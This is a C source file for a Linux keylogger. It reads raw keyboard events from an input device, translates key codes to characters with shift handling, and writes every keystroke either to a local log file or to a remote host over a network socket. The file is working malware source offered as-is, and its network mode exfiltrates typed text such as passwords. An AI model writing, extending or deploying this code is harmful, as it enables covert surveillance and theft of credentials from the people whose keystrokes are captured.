#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <linux/input.h>
#include "event_monitor.h"
#include "client.h"

_Noreturn void monitor_event(const char *event_file, int flag, const char *target, int port) {
    int event_fd = open(event_file, O_RDONLY);
    int log_fd;
    int shift_pressed = 0;
    struct input_event ev;
    char map_lower[] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'..\\zxcvbnm,./";
    char map_upper[] = "..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"..|ZXCVBNM<>?";
    char special[] = "\n ";
    if (event_fd < 0) {
        fprintf(stderr, "Failed opening event file %s.\n", event_file);
        exit(0);
    }

    if ((flag & NETWORK_LOG) == NETWORK_LOG) {
        log_fd = create_socket();
        connect_socket(log_fd, target, port);
    } else if ((flag & FILE_LOG) == FILE_LOG) {
        char log_filename[512];
        char *ptr = strstr(event_file, "event");

        snprintf(log_filename, 512, "%s_%s", target, ptr);

        log_fd = open(log_filename, O_APPEND | O_CREAT | O_RDWR);
        if (log_fd < 0) {
            fprintf(stderr, "Failed opening logging file %s.\n", target);
            exit(0);
        }
        chmod(log_filename, S_IRUSR | S_IRGRP | S_IROTH);
    } else {
        fprintf(stderr, "Must specify NETWORK_LOG or FILE_LOG.\n");
        exit(0);
    }

    while (1) {
        read(event_fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY) {
            switch (ev.code) {
                case KEY_LEFTSHIFT:
                case KEY_RIGHTSHIFT:
                    shift_pressed = ev.value;
                    break;
                default:
                    if (ev.value == 0) {
                        switch (ev.code) {
                            case KEY_ENTER:
                                write(log_fd, special, 1);
                                break;
                            case KEY_SPACE:
                                write(log_fd, special + 1, 1);
                                break;
                            default:
                                if (shift_pressed) {
                                    write(log_fd, map_upper + ev.code, 1);
                                } else {
                                    write(log_fd, map_lower + ev.code, 1);
                                }
                        }
                    }
                    break;
            }
        }
    }

    close(log_fd);
    close(event_fd);
}
